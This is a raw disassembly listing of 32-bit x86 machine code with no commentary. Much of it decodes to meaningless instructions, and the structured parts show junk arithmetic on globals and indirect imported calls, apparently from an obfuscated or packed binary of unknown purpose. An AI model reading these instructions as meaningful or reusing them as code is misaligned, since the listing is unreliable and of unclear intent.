  41874d:	inc    edx
  41874e:	jmp    0x137d397f
  418753:	xor    ebx,DWORD PTR [edi+0xf69f166]
  418759:	sbb    DWORD PTR [ebx-0x6b9e8622],0x68
  418760:	mov    ch,0x1d
  418762:	fisub  DWORD PTR ds:0x7d795db1
  418768:	scas   eax,DWORD PTR es:[edi]
  418769:	inc    ebp
  41876a:	sahf   
  41876b:	adc    eax,0xac3876f2
  418770:	int    0x68
  418772:	daa    
  418773:	out    dx,al
  418774:	add    cl,BYTE PTR [edi-0x2d37c56a]
  41877a:	mov    al,0x29
  41877c:	xlat   BYTE PTR ds:[ebx]
  41877d:	or     BYTE PTR [esi],al
  41877f:	cmp    esi,DWORD PTR [edi-0xe]
  418782:	xor    eax,0x373d86d4
  418787:	mov    dl,BYTE PTR [ebp-0x3f]
  41878a:	test   DWORD PTR [ebx+0x1c],0xb9c4b6b5
  418791:	sbb    BYTE PTR [edi-0x35],bh
  418794:	dec    eax
  418795:	mov    dh,BYTE PTR [eax-0x420725e4]
  41879b:	sub    edi,edx
  41879d:	jp     0x8a741cc4
  4187a3:	lds    eax,FWORD PTR [edi+0x1b8f6db]
  4187a9:	adc    al,0xb8
  4187ab:	xor    ah,ah
  4187ad:	in     eax,dx
  4187ae:	push   esp
  4187af:	(bad)  
  4187b2:	dec    ebx
  4187b3:	dec    ebx
  4187b4:	imul   esi,DWORD PTR [edi-0x2],0x376538f5
  4187bb:	sub    BYTE PTR [edi+eiz*8],ch
  4187be:	jl     0x418779
  4187c0:	loop   0x41879c
  4187c2:	sub    DWORD PTR [eax-0x7b],esi
  4187c5:	xor    bh,BYTE PTR [ebx+0x61]
  4187c8:	int    0xf5
  4187ca:	cmp    eax,0xddfdd8d2
  4187cf:	leave  
  4187d0:	jae    0x4187c3
  4187d2:	fcomp  DWORD PTR [esi]
  4187d4:	test   DWORD PTR [ebx+ebp*4+0x463f73d0],edx
  4187db:	jne    0x41884e
  4187dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187de:	jmp    0xdf1be83b
  4187e3:	rol    BYTE PTR ds:0xfb9ddacf,1
  4187e9:	mov    eax,ds:0x8dde3adb
  4187ee:	and    ebx,DWORD PTR [ebx]
  4187f0:	jo     0x418859
  4187f2:	imul   eax,DWORD PTR [esp+ebx*2-0x39],0x77472945
  4187fa:	clc    
  4187fb:	inc    edi
  4187fc:	sti    
  4187fd:	sub    cl,ah
  4187ff:	jne    0x41881c
  418801:	mov    edi,0x519c5dc6
  418806:	sbb    BYTE PTR [ebx+eax*1-0x5a],ah
  41880a:	xchg   edi,eax
  41880b:	sar    DWORD PTR [esi-0x469dcd74],1
  418811:	xor    al,0x2c
  418813:	mov    esi,0x73c0a82c
  418818:	xchg   esp,eax
  418819:	into   
  41881a:	mov    ds:0xfaa1d689,al
  41881f:	mov    eax,0x500486ae
  418824:	das    
  418825:	pop    esi
  418826:	rcl    DWORD PTR [ebx],cl
  418828:	add    eax,DWORD PTR [eax+edx*1]
  41882b:	out    dx,eax
  41882c:	mov    edx,0x68e72cfc
  418831:	pop    edx
  418832:	cdq    
  418833:	lahf   
  418834:	xor    bh,BYTE PTR [edi+eax*8+0x6a]
  418838:	out    dx,al
  418839:	in     eax,dx
  41883a:	push   cs
  41883b:	call   ecx
  41883d:	repnz cmp eax,0x5b9b46b3
  418843:	adc    BYTE PTR [esp+ebx*2-0x2e43099b],dl
  41884a:	fsub   DWORD PTR [ecx-0x21]
  41884d:	retf   
  41884e:	adc    al,0x7b
  418850:	xchg   edx,eax
  418851:	mov    al,0x52
  418853:	xor    DWORD PTR [eax+0x7e8e73c1],0x65
  41885a:	cmp    esi,DWORD PTR [edi-0xb]
  41885d:	lock in al,dx
  41885f:	ins    DWORD PTR es:[edi],dx
  418860:	sahf   
  418861:	jmp    0xa0b3e16e
  418866:	or     DWORD PTR [ebx-0x4f],ebx
  418869:	clc    
  41886a:	cmp    eax,0xef6eea08
  41886f:	mov    gs,esp
  418871:	sub    edx,DWORD PTR [edi]
  418873:	pop    ebp
  418874:	cdq    
  418875:	xchg   BYTE PTR [edi],ch
  418877:	sbb    al,0x77
  418879:	mov    bh,0xbc
  41887b:	or     DWORD PTR [eax+0x37eafa65],ebp
  418881:	sbb    eax,eax
  418883:	inc    ebx
  418884:	or     eax,0xa7deb1a3
  418889:	add    ch,bl
  41888b:	add    ebp,ebp
  41888d:	inc    ecx
  41888e:	jo     0x4188e6
  418890:	ins    DWORD PTR es:[edi],dx
  418891:	ds push esp
  418893:	imul   ecx,DWORD PTR [ecx+0x44],0x61
  418897:	and    eax,ebp
  418899:	pusha  
  41889a:	push   edi
  41889b:	xlat   BYTE PTR ds:[ebx]
  41889c:	jbe    0x4188de
  41889e:	(bad)  
  41889f:	imul   eax,DWORD PTR [ebx+0x18c5969],0x2c
  4188a6:	ins    BYTE PTR es:[edi],dx
  4188a7:	sahf   
  4188a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188a9:	lock pop edi
  4188ab:	jo     0x418917
  4188ad:	bound  edi,QWORD PTR [edi]
  4188af:	dec    edi
  4188b0:	mov    BYTE PTR [eax],bl
  4188b2:	lods   eax,DWORD PTR ds:[esi]
  4188b3:	or     eax,DWORD PTR [edi-0x75]
  4188b6:	dec    esp
  4188b7:	and    al,0x48
  4188b9:	or     DWORD PTR ds:0x42824b,0x42823b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428163
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428253,0x4282ab
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42819f,0x4282a3
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42824f,0x42838f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42828b,0x7154
  418909:	call   DWORD PTR ds:0x428db8
  41890f:	or     DWORD PTR ds:0x4282a3,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x4283a7,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42832f,0x0
  418935:	mov    DWORD PTR ds:0x42830f,ebx
  41893b:	mov    DWORD PTR ds:0x428293,ebx
  418941:	mov    esi,DWORD PTR ds:0x428263
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42832f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dfc
  41896e:	movzx  esi,WORD PTR ds:0x428333
  418975:	sbb    DWORD PTR ds:0x428173,esi
  41897b:	adc    DWORD PTR ds:0x42837f,0x5f0e
  418985:	xor    DWORD PTR ds:0x4283b7,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428247
  418991:	xor    esi,DWORD PTR ds:0x428183
  418997:	mov    DWORD PTR ds:0x428247,esi
  41899d:	add    DWORD PTR ds:0x428257,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x4283b3,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42838b,0x42824b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428173,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42832b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x4282b3
  4189ec:	mov    edx,DWORD PTR ds:0x42823b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x4283b3,0x606f
  418a03:	mov    DWORD PTR ds:0x42818f,ebx
  418a09:	cmp    DWORD PTR ds:0x42832b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428e00
  418a1c:	adc    DWORD PTR ds:0x42816b,ebx
  418a22:	or     DWORD PTR ds:0x42826f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42821f
  418a34:	mov    edx,DWORD PTR ds:0x428343
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428333
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x4282b7,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x4283b3,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42828b,0x11c5
  418a73:	mov    DWORD PTR ds:0x4283a7,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42816b
  418a85:	mov    eax,ds:0x4282ab
  418a8a:	cmp    DWORD PTR ds:0x4283b3,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428ea0
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428383,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428293,edi
  418ac0:	or     DWORD PTR ds:0x42828b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42837f,ebx
  418ad0:	mov    eax,ds:0x422568
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42818b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0x50b0b184
  418af3:	sub    edi,esi
  418af5:	mov    esi,0x1816cb9a
  418afa:	mov    esp,0xa1181812
  418aff:	xchg   edi,eax
  418b00:	mov    bl,0xf8
  418b02:	xchg   esp,esp
  418b04:	add    al,BYTE PTR [esi+eiz*8-0x21440862]
  418b0b:	gs jo  0x418abf
  418b0e:	push   ebx
  418b0f:	stos   DWORD PTR es:[edi],eax
  418b10:	push   ds
  418b11:	data16 adc ch,BYTE PTR [esi]
  418b14:	es (bad) 
  418b16:	dec    ecx
  418b17:	and    DWORD PTR [ecx+0x24c591e4],esi
  418b1d:	cdq    
  418b1e:	xor    DWORD PTR [ebp-0x2928f2f8],eax
  418b24:	cmp    eax,0xf8f3910d
  418b29:	hlt    
  418b2a:	in     eax,0x7b
  418b2c:	clc    
  418b2d:	add    DWORD PTR [eax],0x56
  418b30:	mov    eax,ds:0xc9fb088c
  418b35:	int3   
  418b36:	mov    ds:0x76aae5d0,eax
  418b3b:	mov    ds:0xf6c1b049,eax
  418b40:	or     ch,BYTE PTR [edx+0x4]
  418b43:	hlt    
  418b44:	jae    0x418b0a
  418b46:	int    0x78
  418b48:	adc    al,al
  418b4a:	adc    eax,0x33671d6b
  418b4f:	nop
  418b50:	or     DWORD PTR [esp+edi*2+0x64],ecx
  418b54:	adc    BYTE PTR [ecx],ah
  418b56:	jne    0x418b4d
  418b58:	or     al,dl
  418b5a:	sar    bh,0xb5
  418b5d:	or     ebx,esi
  418b5f:	int3   
  418b60:	mov    dl,0x14
  418b62:	fwait
  418b63:	in     eax,0x30
  418b65:	fidivr WORD PTR [edx+ebx*2]
  418b68:	sahf   
  418b69:	xchg   ebp,eax
  418b6a:	inc    edx
  418b6b:	mov    bh,0xd8
  418b6d:	add    DWORD PTR [esi-0x75],0x6d
  418b71:	ds lahf 
  418b73:	jo     0x418b60
  418b75:	rcl    ebx,1
  418b77:	jle    0x418b9a
  418b79:	test   al,0xde
  418b7b:	gs pop es
  418b7d:	ror    cl,cl
  418b7f:	ja     0x418b91
  418b81:	and    eax,0x774d15ed
  418b86:	pop    ebp
  418b87:	fs jns 0x418bc3
  418b8a:	adc    BYTE PTR [esp+edx*2],dl
  418b8d:	xchg   cl,bh
  418b8f:	push   es
  418b90:	rol    BYTE PTR [esi+0x2b],cl
  418b93:	mov    ebp,ebx
  418b95:	mov    bh,0xfd
  418b97:	inc    ebp
  418b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b99:	dec    edx
  418b9a:	scas   eax,DWORD PTR es:[edi]
  418b9b:	mov    bl,al
  418b9d:	(bad)  
  418b9e:	and    eax,0x302523f4
  418ba3:	mov    al,0xfe
  418ba5:	daa    
  418ba6:	mov    ecx,DWORD PTR [edx+0x21]
  418ba9:	push   ecx
  418baa:	(bad)  
  418bab:	out    0xc3,eax
  418bad:	loop   0x418bbb
  418baf:	and    ebp,0xb805c3db
  418bb5:	dec    esp
  418bb6:	adc    eax,0x8058b62e
  418bbb:	adc    ch,BYTE PTR [ecx+0x7cead729]
  418bc1:	xor    al,0x1b
  418bc3:	pop    ebx
  418bc4:	adc    ebp,DWORD PTR [eax+ecx*8+0x6a2bb09c]
  418bcb:	mov    esi,0xfcb1606a
  418bd0:	add    DWORD PTR [ecx],edx
  418bd2:	int3   
  418bd3:	inc    esi
  418bd4:	push   ss
  418bd5:	mov    ebx,ebp
  418bd7:	pop    eax
  418bd8:	pop    edi
  418bd9:	stos   BYTE PTR es:[edi],al
  418bda:	mov    edi,0xfd389c90
  418bdf:	cmp    al,0x5a
  418be1:	enter  0xcc23,0x80
  418be5:	sub    BYTE PTR [edi],0xce
  418be8:	and    al,0xba
  418bea:	call   0xbcaa:0x78ae67f
  418bf1:	mov    ch,bl
  418bf3:	fst    DWORD PTR [eax]
  418bf5:	add    al,0x9d
  418bf7:	jge    0x418c46
  418bf9:	add    eax,eax
  418bfb:	inc    ebp
  418bfc:	xchg   ebp,eax
  418bfd:	add    al,0xee
  418bff:	inc    edx
  418c00:	or     ecx,DWORD PTR [edx+0x40]
  418c03:	cmp    eax,0x756ac3dc
  418c08:	inc    ecx
  418c09:	push   eax
  418c0a:	sub    ecx,DWORD PTR [eax+0x67]
  418c0d:	jmp    0x418bab
  418c0f:	sub    bl,ah
  418c11:	stos   BYTE PTR es:[edi],al
  418c12:	dec    edx
  418c13:	test   al,0xc6
  418c15:	inc    eax
  418c16:	inc    esi
  418c17:	or     BYTE PTR [eax-0x4082c010],ah
  418c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1e:	ja     0x418c62
  418c20:	and    eax,0x5560a4fc
  418c25:	xor    DWORD PTR [edx-0x53133d7d],0xffffffff
  418c2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c2d:	push   es
  418c2e:	cwde   
  418c2f:	out    0x28,al
  418c31:	(bad)  
  418c32:	and    eax,0xb993677c
  418c37:	pop    edi
  418c38:	jmp    0x418c3e
  418c3a:	jmp    DWORD PTR [ebx-0x26]
  418c3d:	lods   eax,DWORD PTR ss:[esi]
  418c3f:	jge    0x418c6c
  418c41:	(bad)  
  418c43:	push   edx
  418c44:	mov    dl,0x53
  418c46:	aad    0xe2
  418c48:	scas   al,BYTE PTR es:[edi]
  418c49:	fcom   DWORD PTR [ecx+ebp*1+0x51]
  418c4d:	sbb    BYTE PTR [eax+0x4a],0xfa
  418c51:	fisttp WORD PTR [edi+0x12b4d9ae]
  418c57:	push   ecx
  418c58:	sbb    eax,0xd368fc52
  418c5d:	mov    ecx,0xd6c4d048
  418c62:	js     0x418c75
  418c64:	cmp    ebp,DWORD PTR ds:0xe35e2e07
  418c6a:	lock dec ebp
  418c6c:	and    eax,0x958c61bf
  418c71:	repz fild QWORD PTR [ebp+0x71112a39]
  418c78:	mov    al,ds:0xe48da75
  418c7d:	shl    DWORD PTR [ebx],cl
  418c7f:	xor    eax,0x9f7b37a3
  418c84:	adc    dh,BYTE PTR [edx+edi*8-0x28]
  418c88:	mov    dh,0x58
  418c8a:	inc    edx
  418c8b:	popa   
  418c8c:	or     ah,BYTE PTR [eax+0x3f]
  418c8f:	or     al,0xcb
  418c91:	push   eax
  418c92:	push   esi
  418c93:	push   es
  418c94:	loop   0x418c9d
  418c96:	push   esp
  418c97:	push   0x9182faa7
  418c9c:	pop    edx
  418c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c9e:	ret    
  418c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ca0:	cmp    DWORD PTR [eax],ebx
  418ca2:	daa    
  418ca3:	cmp    DWORD PTR [esi-0x6c4cabbb],0x4e
  418caa:	fwait
  418cab:	das    
  418cac:	loope  0x418c6d
  418cae:	popf   
  418caf:	jl     0x418d10
  418cb1:	xchg   edi,eax
  418cb2:	(bad)  
  418cb3:	call   FWORD PTR [ebp-0x3d21e388]
  418cb9:	mov    ebp,0x7562b91a
  418cbe:	std    
  418cbf:	adc    cl,BYTE PTR [ebx-0x264f6660]
  418cc5:	and    eax,0xcf73651b
  418cca:	xchg   esp,eax
  418ccb:	je     0x418cd1
  418ccd:	aaa    
  418cce:	mov    ebp,0xf61d5506
  418cd3:	sub    ch,BYTE PTR [ebp-0x33]
  418cd6:	js     0x418c8d
  418cd8:	jae    0x418c63
  418cda:	scas   al,BYTE PTR es:[edi]
  418cdb:	sub    eax,0xbdc5355e
  418ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ce1:	adc    cl,0xbc
  418ce4:	cld    
  418ce5:	(bad)  
  418ce6:	mov    esi,0xbcb0c9c6
  418ceb:	xchg   ecx,eax
  418cec:	aas    
  418ced:	inc    esi
  418cee:	loope  0x418c98
  418cf0:	pop    edx
  418cf1:	sub    dh,BYTE PTR ds:0x800c83ec
  418cf7:	into   
  418cf8:	leave  
  418cf9:	data16 jl 0x418d60
  418cfc:	repnz scas eax,DWORD PTR es:[edi]
  418cfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cff:	xchg   ebx,eax
  418d00:	aas    
  418d01:	jge    0x418d0d
  418d03:	shl    BYTE PTR [eax+0x1d],0xbe
  418d07:	aad    0xbc
  418d09:	cmp    BYTE PTR [edx-0x18],al
  418d0c:	ja     0x418d43
  418d0e:	retf   
  418d0f:	(bad)  
  418d10:	dec    esi
  418d11:	dec    esi
  418d12:	sub    bl,BYTE PTR ds:[edx+0x3d]
  418d16:	data16 xor al,0xfd
  418d1a:	jecxz  0x418cdf
  418d1c:	sub    DWORD PTR [edx+0x110d787],0xffffff81
  418d23:	sub    al,cl
  418d25:	nop
  418d26:	retf   
  418d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d28:	xor    BYTE PTR [esi-0x1100777a],0xa3
  418d2f:	push   ebx
  418d30:	ds aas 
  418d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d33:	pusha  
  418d34:	retf   
  418d35:	out    dx,eax
  418d36:	xor    al,0xe4
  418d38:	ins    DWORD PTR es:[edi],dx
  418d39:	jno    0x418ccd
  418d3b:	sub    eax,0xa749026d
  418d40:	ficomp DWORD PTR [ebp+0x44]
  418d43:	xor    DWORD PTR [ecx+edx*1+0x5ffd5192],0x64939234
  418d4e:	call   FWORD PTR [edi-0x23045588]
  418d54:	or     dh,BYTE PTR [edx-0x701aee4a]
  418d5a:	in     eax,dx
  418d5b:	ins    DWORD PTR es:[edi],dx
  418d5c:	jl     0x418d5c
  418d5e:	jge    0x418d0d
  418d60:	inc    esp
  418d61:	adc    edx,DWORD PTR [edi]
  418d63:	inc    esp
  418d64:	cmp    ebx,DWORD PTR [esi]
  418d66:	xchg   BYTE PTR [edx],dh
  418d68:	dec    ebx
  418d69:	inc    esi
  418d6a:	adc    ah,cl
  418d6c:	jmp    0x1be8e70a
  418d71:	popf   
  418d72:	sar    esp,0x13
  418d75:	sub    edi,DWORD PTR [edx]
  418d77:	popa   
  418d78:	out    dx,al
  418d79:	pop    ebx
  418d7a:	fstp   DWORD PTR [eax-0xb603b2a]
  418d80:	cs stos BYTE PTR es:[edi],al
  418d82:	mov    esi,0x351d7d3f
  418d87:	aaa    
  418d88:	(bad)  
  418d89:	icebp  
  418d8a:	mov    edx,0x4fd7c3d3
  418d8f:	sar    DWORD PTR ds:[ebx+0x4c],1
  418d93:	stc    
  418d94:	ret    
  418d95:	sub    eax,0xab5ac4af
  418d9a:	xor    al,0x87
  418d9c:	mov    cl,0x8d
  418d9e:	cmovns edx,DWORD PTR [ebp+0x7]
  418da2:	retf   0x8e66
  418da5:	pop    ss
  418da6:	xchg   edx,eax
  418da7:	mov    ebp,0x9db3b483
  418dac:	mov    ds,ecx
  418dae:	mov    dl,0x87
  418db0:	mov    WORD PTR [esi],ds
  418db2:	cli    
  418db3:	xchg   edx,eax
  418db4:	pop    es
  418db5:	push   es
  418db6:	or     dl,ch
  418db8:	push   ecx
  418db9:	es (bad) 
  418dbb:	fadd   DWORD PTR [eax*4-0x63692470]
  418dc2:	inc    eax
  418dc3:	ins    BYTE PTR es:[edi],dx
  418dc4:	inc    eax
  418dc5:	mov    ah,bl
  418dc7:	or     dh,BYTE PTR [eax]
  418dc9:	bound  esp,QWORD PTR [ecx-0x49506654]
  418dcf:	out    0x42,eax
  418dd1:	ficom  WORD PTR [ecx-0x26a66538]
  418dd7:	xchg   bl,dl
  418dd9:	mov    esi,DWORD PTR [esi]
  418ddb:	cdq    
  418ddc:	test   BYTE PTR es:[eax-0x4a],ch
  418de0:	sub    DWORD PTR [ecx+esi*4+0x3ffc3c61],ecx
  418de7:	aad    0x9d
  418de9:	fs xchg esi,eax
  418deb:	adc    DWORD PTR ds:0xd911b7ec,edx
  418df1:	mov    BYTE PTR [eax+0x16af4a41],bl
  418df7:	add    ebx,DWORD PTR [ebx]
  418df9:	in     al,dx
  418dfa:	fwait
  418dfb:	inc    edx
  418dfc:	cmp    ch,dl
  418dfe:	jb     0x418e4d
  418e00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e01:	push   eax
  418e02:	out    0xaa,al
  418e04:	xchg   edi,eax
  418e05:	jbe    0x418db6
  418e07:	push   edx
  418e08:	xor    ch,BYTE PTR [eax-0x7ee3dc2a]
  418e0e:	xchg   ebp,eax
  418e0f:	push   0xa8161700
  418e14:	jecxz  0x418e69
  418e16:	jb     0x418e66
  418e18:	xchg   DWORD PTR [edi],ebp
  418e1a:	mov    bl,0xd9
  418e1c:	xchg   esp,eax
  418e1d:	iret   
  418e1e:	mov    ?,WORD PTR [eax+0x225723fc]
  418e24:	xor    BYTE PTR [edx+ecx*8-0x6c98bc50],ch
  418e2b:	cli    
  418e2c:	push   edx
  418e2d:	neg    DWORD PTR [edx-0x2f22d521]
  418e33:	dec    ebx
  418e34:	or     ebp,ecx
  418e36:	sar    DWORD PTR [edx+0x2c],cl
  418e39:	mov    ds:0xb7d806d8,eax
  418e3e:	xor    ah,BYTE PTR [edx+eax*2+0x5547b69]
  418e45:	ja     0x418e33
  418e47:	inc    esi
  418e48:	loope  0x418e00
  418e4a:	outs   dx,DWORD PTR ds:[esi]
  418e4b:	sbb    al,0x90
  418e4d:	mov    WORD PTR [esi+0x37],fs
  418e50:	in     al,dx
  418e51:	pop    es
  418e52:	in     al,dx
  418e53:	fdiv   DWORD PTR [edi]
  418e55:	jnp    0x418e53
  418e57:	or     ax,0x1d39
  418e5b:	bound  ebp,QWORD PTR [ecx-0xa4c7216]
  418e61:	pop    edi
  418e62:	mov    ebp,0x576f83f7
  418e67:	xchg   esi,eax
  418e68:	nop
  418e69:	mov    ebp,0x81ccb0a1
  418e6e:	out    dx,al
  418e6f:	add    esi,0xffffffd1
  418e72:	sbb    ebp,ecx
  418e74:	test   eax,0x29e87f0a
  418e79:	mov    dh,0x98
  418e7b:	sub    ebx,ecx
  418e7d:	(bad)  
  418e7f:	scas   eax,DWORD PTR es:[edi]
  418e80:	push   0x4e
  418e82:	adc    al,0x7
  418e84:	fcom   DWORD PTR [eax+0x18]
  418e87:	or     cl,al
  418e89:	mov    ebx,0xb395caea
  418e8e:	ss fcmovnb st,st(6)
  418e91:	add    DWORD PTR [eax-0x1d],0xfb4d4eb7
  418e98:	addr16 push 0xffffffb2
  418e9b:	sahf   
  418e9c:	dec    ebx
  418e9d:	jp     0x418ee5
  418e9f:	mov    dh,BYTE PTR [ebp-0x6c]
  418ea2:	mov    ch,0x68
  418ea4:	dec    ebp
  418ea5:	fcom   QWORD PTR [ebp+ecx*2-0x33]
  418ea9:	xor    ecx,ecx
  418eab:	or     eax,0x23158fd3
  418eb0:	mov    eax,DWORD PTR [eax]
  418eb2:	and    ecx,ecx
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x4283af,0x0
  418ec3:	mov    DWORD PTR ds:0x428177,0x216c
  418ecd:	mov    DWORD PTR ds:0x42827b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428273,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428283,0x562c
  418ef0:	mov    DWORD PTR ds:0x4282ab,0x3af5
  418efa:	cmp    DWORD PTR ds:0x4283af,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428337
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428e04
  418f1a:	not    DWORD PTR ds:0x4281ab
  418f20:	sub    DWORD PTR ds:0x42839f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428163
  418f32:	mov    edx,DWORD PTR ds:0x4282a7
  418f38:	sbb    DWORD PTR ds:0x42838b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x4282e3
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x42831b,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42839f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x4283b3,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x42830b,0x0
  418f6c:	not    DWORD PTR ds:0x428277
  418f72:	not    DWORD PTR ds:0x4281a7
  418f78:	mov    DWORD PTR ds:0x4282ff,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x42832f
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x42830b,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42838b
  418fb5:	call   DWORD PTR ds:0x428e08
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42823f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42819f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42838f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42819b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42817f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42816f,0x0
  41900e:	mov    DWORD PTR ds:0x428183,0x4347
  419018:	mov    DWORD PTR ds:0x4281a7,0x6064
  419022:	mov    DWORD PTR ds:0x42828f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428263,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42816f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428e0c
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282ff
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42823b
  41906c:	or     DWORD PTR ds:0x42837f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi+0x2c70cbfe]
  419095:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419096:	sbb    BYTE PTR [edx+0x1816c33f],ch
  41909c:	mov    esp,0x31181812
  4190a1:	daa    
  4190a2:	adc    BYTE PTR [ecx],ch
  4190a4:	ficom  WORD PTR [ebp-0x1e]
  4190a7:	xchg   esp,eax
  4190a8:	dec    ebp
  4190a9:	ds push 0x56
  4190ac:	cmc    
  4190ad:	xchg   ebp,eax
  4190ae:	mov    dl,0xff
  4190b0:	jnp    0x41903e
  4190b2:	push   0xffffff80
  4190b4:	mov    ah,0x8a
  4190b6:	xor    ebx,ebp
  4190b8:	or     ebp,DWORD PTR [edi]
  4190ba:	fneni(8087 only) 
  4190bc:	jecxz  0x419078
  4190be:	gs pop ecx
  4190c0:	mov    eax,ds:0xde4e6950
  4190c5:	xchg   ebx,eax
  4190c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190c7:	into   
  4190c8:	mov    edx,0x745bd036
  4190cd:	mov    eax,ds:0x8c5bfc24
  4190d2:	cdq    
